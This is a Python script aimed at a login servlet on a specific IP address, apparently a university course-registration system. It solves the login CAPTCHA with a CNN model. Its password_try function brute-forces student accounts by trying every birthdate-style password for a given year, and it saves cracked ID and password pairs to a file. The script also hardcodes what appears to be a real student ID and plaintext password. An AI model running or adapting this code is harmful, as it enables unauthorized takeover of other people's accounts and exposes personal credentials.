
from PIL import Image
import os,time
import course.datatest
import requests
from course.VerifyCodeCNN import CNN
import hashlib


codeurl = 'http://210.42.121.134/servlet/GenImg'
checkUrl='http://210.42.121.134/servlet/Login'

MODEL_SAVE_PATH = './data/model.ckpt'
cnn = CNN(1000, 0.0005, MODEL_SAVE_PATH)
# 代码的健壮性
def gethtml(checkurl,headers,cookies,data):
	i = 0
	while i < 10:
		try:
			html = requests.post(checkUrl, headers = headers, cookies = cookies, data=data,timeout=0.3)
			return html
		except requests.exceptions.RequestException:
			i += 1


def getpic(headers):
	i = 0
	while i < 10:
		try:
			html = requests.get(codeurl, headers = headers,verify=False,timeout=0.3)
			return html
		except requests.exceptions.RequestException:
			i += 1




def log_in(idnum,password):
	headers={"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"}
	valcode = getpic(headers)
	f = open('valcode.png', 'wb')
	f.write(valcode.content)
	f.close()
	md5=hashlib.md5(password.encode('utf-8')).hexdigest()
	print(idnum)
	print(password)
	code = course.datatest.main(cnn)
	data = {"id":idnum,"pwd":md5,"xdvfb":str(code)}
	resp=gethtml(checkUrl,headers,requests.utils.dict_from_cookiejar(valcode.cookies),data)   
	#resp = requests.post(checkUrl, headers = headers, cookies = requests.utils.dict_from_cookiejar(valcode.cookies), data=data)
	
	return resp
	

def password_try(idnum,y,m,d):
	while True:
		for i in range(1,13):
			for j in range(1,32):
				mon=str(i).zfill(2)
				day=str(j).zfill(2)
				password=str(y)+mon+day
				while True:
					res=log_in(idnum,password)
					if res.url!='http://210.42.121.134/servlet/Login':
						f=open('info.txt','a')
						f.write(idnum+' '+password+'\n')
						f.close
						return 1
					else:
						
						if  res.text.find('验证码错误')==-1:
							break
		return 0


def get_course(id,passwd):
	while True:
		res=log_in(id,passwd)
		if res.url!='http://210.42.121.134/servlet/Login':
			return res
		else:
			if  res.text.find('验证码错误')==-1:
				break
	return 0



res=get_course('2017301500258','dingWB0810')
print(res.text)


